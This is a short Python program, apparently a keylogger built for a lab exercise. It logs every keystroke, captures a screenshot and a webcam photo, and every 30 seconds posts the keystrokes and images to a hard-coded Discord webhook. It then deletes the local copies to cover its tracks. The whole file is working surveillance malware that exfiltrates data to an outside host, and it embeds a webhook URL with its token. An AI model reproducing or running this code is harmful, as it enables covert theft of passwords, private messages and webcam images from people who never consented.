# External libraries
from pynput import keyboard
import pyautogui
import cv2
import requests
import os
import time

WEBHOOK_URL = "https://discord.com/api/webhooks/1484940255999299634/66qoF16s9TnE-DzF7OTFOQB8hxrbxc7usgXFey37ac2R88CbszP01CEUDJFIfZkqCz_v"

save_dir = "lab_outputs"
os.makedirs(save_dir, exist_ok=True)

KEYLOG_FILE = os.path.join(save_dir, "keylog.txt")

# Key logging
def on_press(key):
    try:
        k = key.char
    except:
        k = str(key)

    with open(KEYLOG_FILE, "a") as f:
        f.write(k)

listener = keyboard.Listener(on_press=on_press)
listener.start()

# Screenshot
def take_screenshot():
    filename = os.path.join(save_dir, "screenshot.png")
    pyautogui.screenshot().save(filename)
    return filename

# Webcam
def take_camera_photo():
    filename = os.path.join(save_dir, "camera.png")
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite(filename, frame)
    cap.release()
    return filename if ret else None

# Send data
def send_to_discord():
    if not os.path.exists(KEYLOG_FILE):
        return

    with open(KEYLOG_FILE, "r") as f:
        keylog_data = f.read()

    open(KEYLOG_FILE, "w").close()

    screenshot = take_screenshot()
    camera = take_camera_photo()

    # Send keylogs
    requests.post(WEBHOOK_URL, data={
        "content": f"Keylogs:\n```{keylog_data}```"
    })

    # Send media safely
    for file_path in [screenshot, camera]:
        if file_path and os.path.exists(file_path):
            with open(file_path, "rb") as file_obj:
                requests.post(WEBHOOK_URL, files={"file": file_obj})

    # Cleanup
    for f in os.listdir(save_dir):
        file_path = os.path.join(save_dir, f)
        if os.path.isfile(file_path):
            try:
                os.remove(file_path)
            except Exception as e:
                print(f"Error deleting {file_path}: {e}")

# Main loop (CORRECT PLACE)
print("[*] Program running...")

while True:
    time.sleep(30)
    send_to_discord()